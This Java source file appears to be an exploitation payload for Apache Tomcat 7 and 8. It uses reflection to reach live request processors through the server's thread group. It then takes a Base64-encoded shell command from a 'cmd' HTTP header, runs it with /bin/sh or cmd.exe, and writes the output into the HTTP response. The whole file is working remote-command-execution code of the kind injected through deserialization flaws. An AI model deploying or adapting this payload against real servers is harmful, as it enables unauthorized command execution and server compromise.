package com.example.servletdemo;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

/**
 * @author : Walker
 * @date : Created in 2021/8/13 3:49 PM
 *  @date : Modified in 2022/2/10 10:49 AM
 * @description: 修改Tomcat8和7的回显，合并成一个通用的模块，将命令参数{cmd} 内容改为Base64编码
 */

public class Tomcat78EchoTest {
    public Tomcat78EchoTest(){
        try {
            Object obj = Thread.currentThread();
            Field field = obj.getClass().getSuperclass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
            Thread[] threads = (Thread[]) obj;
            for (Thread thread : threads) {
                if (thread.getName().contains("ClientPoller")||thread.getName().contains("Acceptor")) {
                    try {
                        field = thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);

                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);
                        Class var0;
                        try {
                            var0 = Class.forName("org.apache.tomcat.util.net.NioEndpoint");
                            obj = var0.getMethod("getHandler").invoke(field.get(obj));
                        } catch (Exception e) {
                            var0 = Class.forName("org.apache.tomcat.util.net.JIoEndpoint");
                            obj = var0.getMethod("getHandler").invoke(field.get(obj));
                        }
//                        obj = var0.getMethod("getHandler").invoke(field.get(obj));
//                        org.apache.tomcat.util.net.NioEndpoint nioEndpoint = (org.apache.tomcat.util.net.NioEndpoint) field.get(obj);
//                        obj = nioEndpoint.getHandler();
                        try {
                            field = obj.getClass().getDeclaredField("global");
                        } catch (NoSuchFieldException e) {
                            field = obj.getClass().getSuperclass().getDeclaredField("global");
                        }

                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getDeclaredField("processors");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        ArrayList processors = (ArrayList) obj;
                        for (Object o : processors) {
                            try {
                                field = o.getClass().getDeclaredField("req");
                                field.setAccessible(true);
                                obj = field.get(o);
                                org.apache.coyote.Request request = (org.apache.coyote.Request) obj;
                                boolean isLinux = true;
                                String cmd = request.getHeader("cmd");
                                try {
                                    Class clazz = Class.forName("org.apache.tomcat.util.codec.binary.Base64");
                                    Method decoder = clazz.getMethod("decodeBase64", String.class);
                                    cmd = new String((byte[]) decoder.invoke(clazz.newInstance(), cmd), "UTF-8");
                                } catch (Exception e) {

                                }
                                String osTyp = System.getProperty("os.name");
                                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                    isLinux = false;
                                }
                                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c",  cmd};
                                Process process = Runtime.getRuntime().exec(cmds);
                                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                                        new java.io.InputStreamReader(process.getInputStream()));
                                StringBuilder stringBuilder = new StringBuilder();
                                String line;
                                while ((line = bufferedReader.readLine()) != null) {
                                    stringBuilder.append(line + '\n');
                                }
                                byte[] buf = stringBuilder.toString().getBytes();
//                                ByteBuffer byteBuffer = ByteBuffer.wrap(buf);
                                Object var1 = request.getClass().getMethod("getResponse").invoke(request);
                                Object var2;
                                Class var3;
                                try {
                                    var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                                    var2 = var3.newInstance();
                                    var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, buf, new Integer(0), new Integer(buf.length));
                                    var1.getClass().getMethod("doWrite", var3).invoke(var1, var2);
                                } catch (Exception var5) {
                                    var3 = Class.forName("java.nio.ByteBuffer");
                                    var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, buf);
                                    var1.getClass().getMethod("doWrite", var3).invoke(var1, var2);
                                }
//                                request.getResponse().doWrite(byteBuffer);
                                request.getResponse().getBytesWritten(true);
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    break;
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}



